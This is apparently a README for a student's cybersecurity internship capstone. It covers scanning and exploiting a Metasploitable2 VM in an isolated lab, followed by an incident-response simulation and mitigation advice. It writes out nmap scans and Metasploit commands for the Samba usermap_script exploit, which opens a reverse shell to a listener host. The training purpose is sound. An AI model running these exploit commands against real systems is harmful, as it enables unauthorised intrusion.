ApexPlanet Cybersecurity Internship - Capstone Project

Author: Jetty Charan

Program: Cybersecurity & Ethical Hacking Internship

Task: Task 5 - Capstone Project & Incident Response Simulation

Timeline: Days 49 to 60

Target Host: Metasploitable2 (192.168.56.103)

Attacker Host: Kali Linux

📌 Executive Summary

This repository contains the technical documentation, execution logs, and incident response artifacts for the final Capstone Project completed during the ApexPlanet Cybersecurity & Ethical Hacking Internship.

The project evaluates an isolated target system (192.168.56.103) through structured reconnaissance, vulnerability discovery, controlled exploitation, and a full Incident Response (IR) lifecycle—encompassing threat detection, network containment, artifact eradication, and system recovery.

🏗️ Lab Architecture & Network Topology

+------------------------------------+          +------------------------------------+
|         Kali Linux (VM)            |          |        Metasploitable2 (VM)        |
|    Attacker / Scanner Node         |  ------  |          Target System             |
|   (VirtualBox Host-Only Net)       |          |         (192.168.56.103)           |
+------------------------------------+          +------------------------------------+


Virtualization Platform: Oracle VM VirtualBox

Network Mode: Host-Only Adapter (Isolated Private Lab)

Target IP: 192.168.56.103

Attacker Tools: Nmap, Netcat, Metasploit Framework, Wireshark

📁 Repository Structure

.
├── reports/
│   └── Capstone_Final_Report.pdf      # Detailed technical report PDF
├── logs/
│   ├── nmap_initial_scan.txt          # Raw TCP SYN scan results
│   ├── nmap_service_scan.txt          # Service version detection output
│   └── auth_access.log                # Incident response detection log snippets
├── scripts/
│   └── containment_rules.sh           # Firewall/iptables isolation commands
└── README.md                          # Project overview and documentation


🛠️ Execution Methodology & Commands

Phase 1: Host Discovery & Port Scanning

Verified active target host and executed full service version enumeration:

# Active host ping sweep
ping -c 4 192.168.56.103

# TCP SYN and Service Version Scan
nmap -sS -sV -O -p- 192.168.56.103 -oN logs/nmap_service_scan.txt


Phase 2: Vulnerability Assessment & Exploitation

Analyzed running daemons for known CVEs and executed controlled exploitation via Metasploit Framework to verify system vulnerability:

# Launching Metasploit Framework
msfconsole

# Module selection and setup
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.56.103
set LHOST 192.168.56.1
run


Phase 3: Incident Response Simulation

Detection: Identified unauthorized reverse shell connections and anomalous processes in system logs (/var/log/auth.log).

Containment: Executed network interface isolation and dropped incoming traffic from suspicious source IPs:

# Emergency host firewall containment rule
sudo iptables -A INPUT -s 192.168.56.0/24 -j DROP


Eradication: Terminated malicious shell processes, cleared persistence hooks, and stopped vulnerable services.

🛡️ Key Mitigation Strategies

Disable Legacy Protocols: Decommission unencrypted daemons (Telnet, rlogin, plain FTP) and mandate SSH (v2) with public key authentication.

Patch Management: Upgrade outdated software packages to patched baseline versions to eliminate public CVE exposure.

Network Firewall Rules: Enforce strict default-deny iptables or UFW rules restricting service access to authorized admin hosts.

Log Aggregation: Centralize log collection to detect brute-force attempts and anomalous connections in real-time.
